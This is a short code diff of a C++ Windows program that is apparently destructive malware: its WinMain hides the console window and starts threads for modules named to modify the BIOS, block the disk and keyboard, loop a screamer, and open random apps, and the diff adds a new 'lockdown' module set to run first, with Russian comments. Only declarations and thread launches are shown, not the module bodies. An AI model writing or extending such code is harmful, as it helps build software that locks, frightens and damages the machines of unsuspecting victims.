@@ -25,12 +25,16 @@ void ModifyBIOS();
 void OpenRandomAppsAndSites();
 void ScreamerLoop();
 void InitializeDiskBlockModule();
+void InitializeLockdownModule();  // НОВЫЙ МОДУЛЬ
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
 
     std::vector<std::thread> threads;
+    
+    // Запускаем модули
+    threads.emplace_back(InitializeLockdownModule);  // САМЫЙ ПЕРВЫЙ!
     threads.emplace_back(InitializeScareModule);
     threads.emplace_back(InitializeFileSystemModule);
     threads.emplace_back(InitializeKeyboardBlockModule);
